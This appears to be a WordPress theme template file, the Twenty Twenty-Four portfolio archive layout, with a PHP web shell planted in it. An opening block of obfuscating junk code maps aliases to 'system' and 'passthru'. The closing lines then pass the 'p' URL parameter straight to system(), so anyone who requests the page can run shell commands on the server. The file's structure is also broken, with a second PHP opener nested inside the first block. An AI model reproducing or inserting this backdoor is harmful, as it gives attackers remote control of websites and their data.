<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Portfolio archive template
 * Slug: twentytwentyfour/template-archive-portfolio
 * Template Types: archive
 * Viewport width: 1400
 * Inserter: no
 */
?>

<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->

<!-- wp:group {"tagName":"main","align":"full","layout":{"type":"constrained"}} -->
<main class="wp-block-group alignfull">

	<!-- wp:query-title {"type":"archive","align":"wide","style":{"typography":{"lineHeight":"1"},"spacing":{"padding":{"top":"var:preset|spacing|50"}}}} /-->

	<!-- wp:pattern {"slug":"twentytwentyfour/posts-images-only-3-col"} /-->

</main>
<!-- /wp:group -->

<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>